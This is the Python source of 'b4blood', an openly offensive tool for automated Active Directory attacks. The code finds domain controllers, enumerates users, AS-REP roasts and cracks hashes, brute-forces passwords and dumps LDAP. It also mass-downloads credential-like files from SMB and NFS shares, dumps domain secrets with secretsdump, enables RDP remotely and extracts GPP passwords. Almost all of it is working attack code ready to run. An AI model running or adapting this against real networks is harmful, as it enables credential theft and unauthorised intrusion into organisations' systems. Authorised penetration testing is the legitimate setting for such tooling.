#!/usr/bin/python3

import time
from multiprocessing import Process
import sys
import os
import argparse
import subprocess
import re
import random

path_impacket="/opt/impacket/examples"

red = "\033[0;31m"
green = "\033[0;32m"
yellow = "\033[0;33m"
blue = "\033[0;34m"
white = "\033[0;37m"

dumpDB=0
asrep=0
def printf(message,color):
		print(color+"[*]"+blue+message+white)

def nmap_thread(ip_to_scan):
	os.system(f"nmap {ip_to_scan} --top-ports 10000 -Pn -sCV -T4 > full_DC_nmap.txt  ")
	printf( " full Nmap scan finished",green)

def parse_arg():

	parser = argparse.ArgumentParser(description="b4blood --ip 192.168.0.40, b4blood --ip 192.168.0.0/24, b4blood --internal -i eth0")
	parser.add_argument("--ip", help="Provide an IP or a range, 192.168.0.23, 192.168.8.*, 192.168.7.0/24")
	parser.add_argument("--internal", action="store_true", help="DHCP broadcast resquest, you must be physicaly on the network.")
	parser.add_argument("--nsd", action="store_true", help="no smb dump for saving time.")
	parser.add_argument("-U", help="Provide your own userlist to Kerbrute users. Default xato-net-10-million-usernames. b4blood --ip 192.168.0.8 -U users.txt")
	parser.add_argument("-P", help="Provide your own passlist to Kerbrute users. Default rockyou.txt. b4blood --ip 192.168.0.8 -P pass.txt, b4blood --ip 192.168.0.8 -U users.txt -P pass.txt")
	parser.add_argument("-i", help="Interface for internal scan")
	args = parser.parse_args()	
	#print(args) 
	return args.ip, args.internal, args.U, args.P, args.i, args.nsd

def asrepHashCredExtract(hash):
    hash=hash.replace("\n","")
    return hash.split("$")[3].split("@")[0].replace(" ","")+":"+hash.split(":")[2].replace(" ","")

def kerbrute_bruteuser_cred_extract(ker):
	#print(ker)
	ker=ker.replace("\n","")
	ker=ker.replace("\x1b[32m","")
	ker=ker.replace("\x1b[0m","")
	ker=ker.split(" ")[7]
	return ker.split("@")[0].replace(" ","")+":"+ker.split(":")[1].replace(" ","")

def dumpLdapDB(cont, ip_to_scan, Domain_Name):
	print("")
	printf(" Dumping LDAP",green)
	if len(cont) > 1:
		for i, item in enumerate(cont):
			print(i+1, item.replace("\n",""))

		a=input(blue+f"Choose a cred: from 1 to {len(cont)}: "+white)
		cred=cont[int(a)-1].replace("\n","")				
	else:
		cred=cont[0]

	user=cred.split(":")[0]
	passw=cred.split(":")[1].replace("\n","")
	printf(f" Dumping AD with {user}:{passw} --> ldap_from{user}/	"+yellow+f"You should run after the complete scan: b4blood --ip {ip_to_scan} -U users_from_{user}.txt",green)
	os.system(f'if [ ! -d "ldapdump_from_{user}" ];then mkdir ldapdump_from_{user}; fi')
	os.system(f'cd ldapdump_from_{user}; ldapdomaindump -u "{Domain_Name}\\{user}" -p {passw} {ip_to_scan} 2>/dev/null; cd ..')	

	if os.path.isfile(f'ldapdump_from_{user}/domain_users.grep'):
		dumpDB=1
		os.system(f'cat ldapdump_from_{user}/domain_users.grep | cut -f3 | grep -v name > users_from_{user}.txt')
		os.system(f'cat ldapdump_from_{user}/domain_users.grep | cut -f3,12 | grep -v name > users_from_{user}_description.txt')
		print()
		printf(" Could be interesting",green)
		with open(f'users_from_{user}_description.txt','r') as fichier:
			contenu=fichier.readlines()
		
		for item in contenu:
			item=item.split()
			if len(item) >1:
				print(white+f'{item[0]:<20}'+ yellow+" ".join(item).replace(item[0],""))
		print(white)
	else:
		printf(" LDAP dumping failed!",red)


banner ="""

  __ )   |  |    __ )   |       _ \    _ \   __ \  
  __ \   |  |    __ \   |      |   |  |   |  |   | 
  |   | ___ __|  |   |  |      |   |  |   |  |   | 
 ____/     _|   ____/  _____| \___/  \___/  ____/  
"""

print(red+banner+white)
print("https://github.com/moloch54/b4blood")
print()
print("Find Domain Controller on a network, enumerate users, AS-REP Roasting and hash cracking, bruteforce password, dump AD users, scan SMB shares and remote accesses.")
print("2023 by Moloch\n")

ip,internal,U,P,interface, nsd = parse_arg()
ip_to_scan = ip

if ip_to_scan == None and internal==False:
	print("b4blood --ip <IP> <OPTIONS>")
	print("b4blood -h       for help")
	exit()

if os.geteuid() != 0:
    printf(" You need to have root privileges to run this script.\n    Please try again, this time using 'sudo'. Exiting.",red)
    exit()


# forging dependencies
os.system('if [ ! -f "all_creds.txt" ];then touch "all_creds.txt"; fi')
os.system('if [ ! -d "libs" ];then mkdir libs; fi')
script="""
	#!/usr/bin/bash
	sudo nmap --script broadcast-dhcp-discover 2>/dev/null > nmap_disco_temp.txt
	chown $USER:$USER nmap_disco_temp.txt
	"""
with open ("libs/dhcp_query.sh","w") as fichier:
	fichier.write(script)
os.system("chmod +x libs/dhcp_query.sh")

script="""
	#!/usr/bin/bash
	sudo ntpdate $1
	"""
with open ("libs/ntp_sync.sh","w") as fichier:
	fichier.write(script)
os.system("chmod +x libs/ntp_sync.sh")


# script begins
#os.system("rm * -rf /tmp/")
if internal:
	if interface==None:
		printf(" Need an interface! sudo AD_exploit.py --internal -i eth0",red)
		exit()

	
	printf(" requesting DHCP",green)
	cmd='libs/dhcp_query.sh'	
	subprocess.call(cmd, shell=True)

	with open("nmap_disco_temp.txt","r") as fichier:
		contenu=fichier.read().split("Response")
	os.system("rm nmap_disco_temp.txt")
	inter_to_scan=""
	for i,item in enumerate(contenu):
		if interface in item:
			inter_to_scan = item

	if not inter_to_scan:
		printf( " interface not found !!!",red)	
		exit()
	
	with open("nmap_disco_iface.txt","w") as fichier:
		fichier.write(inter_to_scan)

	os.system('cat nmap_disco_iface.txt | grep "Server Identifier" | cut -d ":" -f2 > nmap_dhcp_discover.txt')
	os.system('cat nmap_disco_iface.txt | grep Domain | cut -d ":" -f2 >> nmap_dhcp_discover.txt')
	os.system("rm nmap_disco_iface.txt")

	with open("nmap_dhcp_discover.txt","r") as fichier:
		contenu=fichier.readlines()
	os.system("rm nmap_dhcp_discover.txt")

	primary_dns=""
	domain_name=""
	dhcp=""


	if len(contenu) >=1:
		dhcp = contenu[0].split(",")[0].replace(" ","")
		dhcp = dhcp.replace("\n","")
		printf(f" DHCP:	 {dhcp}",green)
	if len(contenu) >=2:
		primary_dns = contenu[1].split(",")[0].replace(" ","")
		primary_dns = primary_dns.replace("\n","")
		printf(f" primary DNS: {primary_dns}",green)
	if len(contenu) >=3:
		domain_name = contenu[2].replace(" ","")
		domain_name = domain_name.replace("\n","")
		domain_name = domain_name.replace("\\x00","")
		printf(f" domain name: {domain_name}",green)

	if not any(x in primary_dns for x in ["192","172","10"]):
		printf(" primary DNS is not in the local network, try without --internal",red)
		exit()

	if domain_name !="":
		printf(" Resolving domain name",green)	

		os.system(f'dig @{primary_dns} {domain_name} +short  > domain_name_resolved.txt')
		with open("domain_name_resolved.txt") as fichier:
			contenu=fichier.readlines()

		if len(contenu) >1:
			printf(" error resolving domain name, adding DHCP and DNS to the hostslist to scan. May retry without --internal", red)

			os.system(f"echo {dhcp} > hostslist.txt")
			os.system(f"echo {primary_dns} >> hostslist.txt")

		if len(contenu) == 1:
			with open("domain_name_resolved.txt","r") as fichier:
				contenu = fichier.read()
			printf(f" resolving success: {domain_name} {contenu}",green)
			os.system("cp domain_name_resolved.txt hostslist.txt")
	if not domain_name:
		printf(" no domain name, adding the primary DHCP and DNS to the hostslist to scan", red)
		os.system(f"echo {dhcp} > hostslist.txt")
		os.system(f"echo {primary_dns} >> hostslist.txt")
	os.system(f'nmap -p 88 -iL hostslist.txt -Pn -T4 | grep "open" -B5 | grep "Nmap scan report" | cut -d " " -f 5- >  DC_list.txt')
	#os.system("rm hostslist.txt")


else:
	if any(x in ip_to_scan for x in ["*","/"]):
		printf(f" scanning {ip_to_scan} for a Domain Controller, should take a while... --> DC_list.txt",green)
		os.system(f'nmap -p 88 {ip_to_scan} -Pn -T4 | grep "open" -B5 | grep "Nmap scan report" | cut -d " " -f 5- > DC_list.txt')
		with open("DC_list.txt","r") as fichier:
			contenu=fichier.readlines()
		if contenu !=0:
			printf(" Domain Controller found!",green)
	else:
		os.system(f'echo {ip} > DC_list.txt ')

with open("DC_list.txt","r") as fichier:
	contenu=fichier.readlines()

if not contenu:
	if ip_to_scan == None:
		ip_to_scan=""
	printf(f" No Domain Controller found on the network {ip_to_scan}", red)
	exit()

reg=re.compile("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")

if len(contenu) > 1:
	for i,item in enumerate(contenu):
		print(i+1,item.replace("\n",""))

	a=input(f"\033[0;33mChoose a DC: from 1 to {len(contenu)}: \033[0;37m")
	zob=contenu[int(a)-1].replace("\n","")
	zob=re.findall(reg,zob)[0]
	os.system(f'echo "{zob}" > DC.txt')
else:
	os.system('cp DC_list.txt DC.txt')
	#os.system("rm DC_list.txt")
with open("DC.txt","r") as fichier:
	contenu=fichier.readlines()
ip_to_scan = contenu[0].replace("\n","")
ip_to_scan=re.findall(reg,ip_to_scan)[0]


printf(f" scanning the Domain Controller {ip_to_scan}", green)

os.system(f'nmap {ip_to_scan} -p 22,139,389,445,2049,3268,3389,5985 -Pn | grep open > nmap_scan.txt; nmap {ip_to_scan} -p 3389 -sC -Pn >> nmap_scan.txt')
os.system(f'cat nmap_scan.txt | grep DNS_Domain_Name | cut -d ":" -f2 >> DC.txt')

with open('DC.txt', 'r') as fichier:
	contenu = fichier.readlines()
os.system("rm DC.txt")


if len(contenu) <=1:
	printf(f" No Domain Name found on {ip_to_scan}", red)
	#exit()
	Domain_Name=""
	krb=0
else:
	Domain_Name = contenu[1].replace("\n","")
	Domain_Name = Domain_Name.replace(" ","")
	krb=1

print("")
printf(' '+green+f'DC {ip_to_scan} {Domain_Name}'+white,green )
printf(' NTP synchronizing with the DC for Kerberos',green)
cmd=f'libs/ntp_sync.sh {ip_to_scan}'
subprocess.call(cmd,shell=True)

if os.path.isfile("full_DC_nmap.txt"):
	with open("full_DC_nmap.txt","r") as fichier:
		contenu=fichier.readlines()
else:
	contenu=[]		
#if len(contenu) <6:
#	printf(" launching full Nmap scan on a thread --> full_DC_nmap.txt"+white,green)
#	thread=Process(target=nmap_thread, args=(ip_to_scan,))
#	thread.start()

with open("nmap_scan.txt","r") as fichier2:
		contenu_nmap=fichier2.readlines()
os.system("rm nmap_scan.txt")
ssh=0
smb=0
winrm = 0
ldap=0
nfs=0
rdp=0
for item in contenu_nmap:
	if "22/tcp" in item:
		ssh=1
	if "445/tcp" in item:
		smb=1
	if "5985/tcp" in item:
		winrm=1
	if "389/tcp" or "3268/tcp" in item:
		ldap=1
	if "2049/tcp" in item:
		nfs=1
	if "3389/tcp" in item:
		rdp=1

if smb==1:
		printf(" scanning SMB vulns ",green)
		os.system(f"nmap {ip_to_scan}  -Pn --script vuln -p 445 -v | grep 'VULNERABLE:' -C 1 > smb_vuln.txt")
		with open("smb_vuln.txt","r") as fichier:
			cont=fichier.readlines()
		if len(cont)>1:
			for it in cont:
				print(yellow+it.replace("\n","")+white)
			print()
		else:
			os.system("rm smb_vuln.txt")

		# scan anonymous shares
		if not nsd:
			os.system('if [ ! -d "smb_dump" ];then mkdir smb_dump; fi')
			os.system('if [ ! -d "shares" ];then mkdir shares; fi')
			printf(' scanning for anonymous smb shares  --> /smb_dump',green)
			os.system(f"smbmap -H {ip_to_scan} -u ' ' -p ' ' | grep -v Working | tee shares/anonymous_shares.txt")
			with open("shares/anonymous_shares.txt","r") as fic:
				co=fic.readlines()
			if len(co)<2:
				print("via smbclient")
				os.system(f"smbclient -L {ip_to_scan} -N | tee shares/anonymous_shares.txt")

			with open("shares/anonymous_shares.txt","r") as fic:
				co=fic.readlines()

			if len(co) >1:

				# anonymous creds
				# on dump all ici!
				print("")
				os.system("cat shares/anonymous_shares.txt | grep 'READ\|Disk' | awk '{print $1}' > shares/shares_.txt")
				with open("shares/shares_.txt","r") as fichier3:
					shares=fichier3.readlines()
				os.chdir("./smb_dump")
				file_content="account,compte,cred,user,pass,util,backup,note,vbs,ps1,bat,code,conf,cfg,rsa,pem,key,xml,xslx,doc,id,txt,zip".split(",")
				for share in shares:
					share=share.replace("\n","")
					share=share.replace(" ","")

					# on récupère les directories récursivement		
					cmd=f"smbclient //{ip_to_scan}/{share} -N -c 'recurse on;ls' | grep -E '^\\"+"\\"+"'" + "| awk '{print $1}' "+f" > ../shares/all_folders_{share}.txt"
					print(blue+f"Dumping {share}	Could take a while..."+white)
					os.system(cmd)
					
					# scan /
					cmd=f"recurse on; prompt off;"
					for fc in file_content:	
						cmd+=f"mget *{fc}*;"

					os.system(f'smbclient //{ip_to_scan}/{share} -N -c "{cmd}">/dev/null')

					with open(f"../shares/all_folders_{share}.txt","r") as fshare:
						contenu_fshare=fshare.readlines()

					for folders in contenu_fshare:
						folders=folders.replace("\n","")	
						cmd=f"recurse on; prompt off;cd {folders};"
						for fc in file_content:
							cmd+=f"mget *{fc}*;"
						os.system(f'smbclient //{ip_to_scan}/{share} -N -c "{cmd}">/dev/null')

				os.chdir("../")
			print()

		if os.path.isdir("smb_dump"):
			printf(" could be interesting in /smb_dump",green)
			for filename in os.listdir("./smb_dump"):
				print(yellow+filename+white)
			print()

if ldap:
	printf(' Looking for LDAP null bind',green)
	a=Domain_Name.split(".")
	b=""
	for item in a:
		b=b+"DC="+f"{item}"+","
	b=b[:-1]
	os.system(f"ldapsearch -LLL -x -H ldap://{ip_to_scan} -b '{b}' 2>/dev/null | grep sn | cut -d' ' -f2 | tee ldapnull_users.txt")
	with open("ldapnull_users.txt","r") as fichier:
		contenu=fichier.readlines()
	if len(contenu) !=0:
		U = "ldapnull_users.txt"	
	else:
		os.system("rm ldapnull_users.txt")
else:
	printf(" no LDAP found",red)


if nfs:
	printf(" scanning NFS",green)
	r=random.randrange(1000000)
	os.system(f"showmount -e {ip_to_scan} > NFS.txt")
	os.system("cat NFS.txt | grep '/' | cut -d '/' -f2 | awk '{print $1}' > NFS_shares.txt")
	os.system('if [ ! -d "NFS" ];then mkdir "NFS"; fi')
	os.system(f'if [ ! -d "/tmp/nfs_temp_{r}" ];then mkdir "/tmp/nfs_temp_{r}"; fi')
	with open("NFS_shares.txt","r") as f:
		anon_shares=f.readlines()

	for anon_share in anon_shares:
		anon_share=anon_share.replace("\n","")
		printf(f" try to mount {ip_to_scan}://{anon_share} and dumping juicy files in /NFS",green)
		try:
			os.system(f"mount -t nfs {ip_to_scan}:/{anon_share} /tmp/nfs_temp_{r}")
		except:
			pass
		try:
			os.system(f"cp /tmp/nfs_temp_{r}/* ./NFS")
		except:
			pass
		if os.listdir("./NFS"):
			printf(" could be interesting in /NFS",green)
			os.chdir("./NFS")

			# bug quand folders
			for filename in os.listdir("./"):
				print(yellow+filename+white)
			os.chdir("../")
			print()


if U ==None:
	U="/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt"

if krb:
	printf(f' KERBRUTING valid users, (CTRL+C) to end',green)

	os.system(f"kerbrute userenum --dc={ip_to_scan} -d={Domain_Name} {U} |  tee kerbrutelog.txt | grep 'VALID'")

	print("")
	os.system('cat kerbrutelog.txt | grep VALID | cut -f2 | cut -d "@" -f1 | cut -d " " -f2 > valid_users.txt')
	os.system("rm kerbrutelog.txt")
	

	with open('valid_users.txt', 'r') as fichier:
			contenu = fichier.readlines()
	if  len(contenu) !=0:

		# to do check si valid users!
		printf(' AS-REP Roasting valid users',green)
		os.system(f'python3 {path_impacket}/GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip {ip_to_scan} {Domain_Name}/ > GetNPUsers.log' )
		os.system('cat GetNPUsers.log | grep krb5 > kerberhashs.txt')
		os.system("rm GetNPUsers.log")
		with open('kerberhashs.txt', 'r') as fichier:
			contenu = fichier.readlines()
		if not contenu:

			printf(f" AS-REP Roasting failed !", red)
			os.system("rm kerberhashs.txt")
		else:
			printf(" Hash(es) found!",green)
			asrep=1
			for hash in contenu:
				print(hash.replace("\n",""))
			if P ==None:
				P="/usr/share/wordlists/rockyou.txt"
			printf(f"Lauching {P} against the kbr5 hash(es), please wait... --> kbr5asrep_creds.txt",green)
			print(green)
			os.system(f'hashcat --quiet -m 18200 kerberhashs.txt {P} | tee kbr5asrep_creds.txt')    
			print(white)
			with open("kbr5asrep_creds.txt","r") as fichier:
				contenu=fichier.readlines()
			if not contenu:
				printf(" No kbr5 hash(es) cracked",red)
			else:
				with open("all_creds.txt","r+") as fichier2:
					contenu_all_creds=fichier2.readlines()
					#print(contenu_all_creds)
					#print(contenu)

					for item in contenu:
						#print(item)
						cred=asrepHashCredExtract(item)
						print(yellow+cred+white+"	(added to all_creds.txt)\n")
						#print(contenu_all_creds)
						if (cred+"\n") not in contenu_all_creds:	
							os.system(f"echo '{cred}' >> all_creds.txt")

contenu=[]
if os.path.isfile(f'valid_users.txt'):
	with open("valid_users.txt") as fichier:
		contenu=fichier.readlines()

print("")
if len(contenu) !=0:
	printf(" Bruteforcing passwords",green)
	for i,user in enumerate(contenu):
		print(i+1,user.replace("\n",""))
	a=input(blue+f"Which user to bruteforce? 0=None: "+white)
	if a!="0":
		user=contenu[int(a)-1].replace("\n","")
		print("")
		if P ==None:
			P="/usr/share/wordlists/rockyou.txt"
		printf(f" Lauching {P} against {user}@{Domain_Name}",green)
		os.system(f"kerbrute bruteuser --dc {ip_to_scan} -d {Domain_Name} {P} {user} -v | grep 'VALID' | tee kerbrute_{user}_tmp.txt")
		os.system(f"cat kerbrute_{user}_tmp.txt  | grep 'VALID' 2>/dev/null > creds_{user}.txt; rm kerbrute_{user}_tmp.txt ")
		#exit()
		with open(f"creds_{user}.txt","r") as fichier:
				contenu=fichier.readlines()
		if not contenu:
			print("")
			printf(" No password cracked",red)
			#exit()
		else:
			print("")
			with open("all_creds.txt","r+") as fichier2:
				contenu_all_creds=fichier2.readlines()
				#print(contenu_all_creds)
				#print(contenu)

				for item in contenu:
					cred=kerbrute_bruteuser_cred_extract(item)
					print(yellow+cred+white+"	(added to all_creds.txt)\n")
					#print(contenu_all_creds)
					if (cred+"\n") not in contenu_all_creds:	
						os.system(f"echo '{cred}' >> all_creds.txt")
else:
	printf(" No valid user found!",red)

contenu=[]
if os.path.isfile(f'all_creds.txt'):
	with open("all_creds.txt","r") as fichier:
		contenu=fichier.readlines()

if ldap:
	if len(contenu) !=0:
		dumpLdapDB(contenu, ip_to_scan, Domain_Name)


if len(contenu) !=0:
	print()
	printf(" scanning SMB shares for passwords, DRSUAPI, remote access: --> /smb_dump", green)
	print("")
	for cred in contenu:
		user=cred.split(":")[0]
		passw=cred.split(":")[1].replace("\n","")
		print(green+f"{user}:{passw}"+white)
		
		if smb and not nsd:
			os.system('if [ ! -d "smb_dump" ];then mkdir smb_dump; fi')
			os.system('if [ ! -d "shares" ];then mkdir shares; fi')
			os.system(f'smbmap -u {user} -p {passw} -d {Domain_Name} -H {ip_to_scan} | tee shares/smbshares_{user}.txt')

			print()
			os.system(f"cat shares/smbshares_{user}.txt | grep READ | cut -f2 > shares/shares_{user}.txt")
			with open(f"shares/shares_{user}.txt","r") as fichier3:
				shares=fichier3.readlines()
			os.chdir("smb_dump")
			file_content="account,compte,cred,user,pass,util,backup,note,vbs,ps1,bat,code,conf,cfg,rsa,pem,key,xml,xslx,doc,id,txt,zip".split(",")
			for share in shares:
				share=share.replace("\n","")
				share=share.replace(" ","")
				
				# on récupère les directories récursivement		
				cmd=f"smbclient //{ip_to_scan}/{share} -U '{Domain_Name}\\{user}%{passw}' -c 'recurse on;ls' | grep -E '^\\"+"\\"+"'" + "| awk '{print $1}' "+f" > ../shares/all_folders_{share}.txt"
				print(blue+f"Dumping {share}	Could take a while..."+white)
				os.system(cmd)
				
				# scan /
				cmd=f"recurse on; prompt off;"
				for fc in file_content:	
					cmd+=f"mget *{fc}*;"
				os.system(f'smbclient //{ip_to_scan}/{share} -U "{Domain_Name}\\{user}%{passw}" -c "{cmd}" > /dev/null')

				with open(f"../shares/all_folders_{share}.txt","r") as fshare:
					contenu_fshare=fshare.readlines()

				for folders in contenu_fshare:
					folders=folders.replace("\n","")	
					cmd=f"recurse on; prompt off;cd {folders};"
					for fc in file_content:
						cmd+=f"mget *{fc}*;"
					os.system(f'smbclient //{ip_to_scan}/{share} -U "{Domain_Name}\\{user}%{passw}" -c "{cmd}" > /dev/null')
			print()

			os.chdir("../")
			if os.listdir("./smb_dump"):
				printf(" Could be interesting in smb_dump/",green)
				for filename in os.listdir("./smb_dump"):
					print(yellow+filename+white)
				print()

		if smb:
			os.system(f'crackmapexec --timeout 2 smb {ip_to_scan} -u {user} -p {passw}')
			os.system(f'python3 {path_impacket}/secretsdump.py  {Domain_Name}/{user}:{passw}@{ip_to_scan}')

		if ssh:
			os.system(f'crackmapexec --timeout 2 ssh {ip_to_scan} -u {user} -p {passw}')

		if rdp:
			os.system(f'crackmapexec --timeout 2 smb {ip_to_scan} -u {user} -p {passw} -M rdp -o ACTION=enable')

		if winrm:
			os.system(f'crackmapexec --timeout 2 winrm {ip_to_scan} -u {user} -p {passw} --fail-limit 2 -d {Domain_Name}')
		print()

if len(contenu) !=0:
	user=contenu[0].split(":")[0]
	passw=contenu[0].split(":")[1].replace("\n","")
	printf(" scanning Kerberoastable accounts:",green)
	os.system(f"python /opt/impacket/examples/GetUserSPNs.py -dc-ip {ip_to_scan} {Domain_Name}/{user}:{passw} | grep -v Impacket")

if os.path.isdir("./smb_dump"):
	os.chdir("./smb_dump")
	for filename in os.listdir("./"):
		if ".xml" in filename:
			xml_flag=1
		else:
			xml_flag=0
		if xml_flag==1:		
			printf(" parsing .xml files for GPP passwords",green)
			for filename in os.listdir("./"):
				if ".xml" in filename:
					print(filename)
					os.system(f"python {path_impacket}/Get-GPPPassword.py -xmlfile '{filename}' 'LOCAL' " + " | grep 'Username\\|Password' | awk '{print $4}' 2>/dev/null 1>xml_cred.txt")
					with open("xml_cred.txt","r") as fichier:
						contenu=fichier.readlines()
					os.system("rm xml_cred.txt")
					if len(contenu)==2:
						u=contenu[0].replace("\n","")
						p=contenu[1].replace("\n","")
						cred=u+":"+p
						if cred !=":":
							printf(f" Found in smb_dump/{filename}:",green)
							print(yellow+cred+white+"	\t(Added to all_creds.txt)")

							os.chdir("../")
							with open("all_creds.txt","r+") as fichier2:
								contenu_all_creds=fichier2.readlines()
							if (cred+"\n") not in contenu_all_creds:	
								os.system(f"echo '{cred}' >> all_creds.txt")
	os.chdir("../")



print()
with open("all_creds.txt","r") as fichier:
	contenu=fichier.read()
	if contenu:
		printf(" All creds:", green)
		print(yellow+contenu+white)



 